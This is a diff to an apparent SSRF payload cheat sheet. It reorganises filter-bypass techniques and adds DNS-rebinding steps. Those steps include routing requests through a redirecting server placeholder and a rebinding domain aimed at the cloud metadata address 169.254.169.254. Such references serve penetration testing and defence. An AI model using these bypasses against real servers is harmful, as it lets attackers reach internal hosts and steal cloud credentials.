@@ -79,22 +79,6 @@ http://localhost:443
 http://localhost:22
 ```
 
-Advanced exploit [using a redirection](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
-
-```powershell
-1. Create a subdomain pointing to 192.168.0.1 with DNS A record  e.g:ssrf.example.com
-2. Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
-vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
-```
-
-Advanced exploit using type=url
-
-```powershell
-Change "type=file" to "type=url"
-Paste URL in text field and hit enter
-Using this vulnerability users can upload images from any image URL = trigger an SSRF
-```
-
 ## Bypassing filters
 
 ### Bypass using HTTPS
@@ -237,6 +221,30 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
+### Bypassing using a redirect
+[using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
+
+```powershell
+1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
+2. Launch the SSRF pointing to  vulnerable.com/index.php?url=http://YOUR_SERVER_IP
+vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
+```
+
+### Bypassing using type=url
+
+```powershell
+Change "type=file" to "type=url"
+Paste URL in text field and hit enter
+Using this vulnerability users can upload images from any image URL = trigger an SSRF
+```
+
+### Bypassing using DNS Rebinding (TOCTOU)
+
+```powershell
+Create a domain that change between two IPs. http://1u.ms/ exists for this purpose.
+For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain:
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+```
 
 ## SSRF exploitation via URL Scheme
 
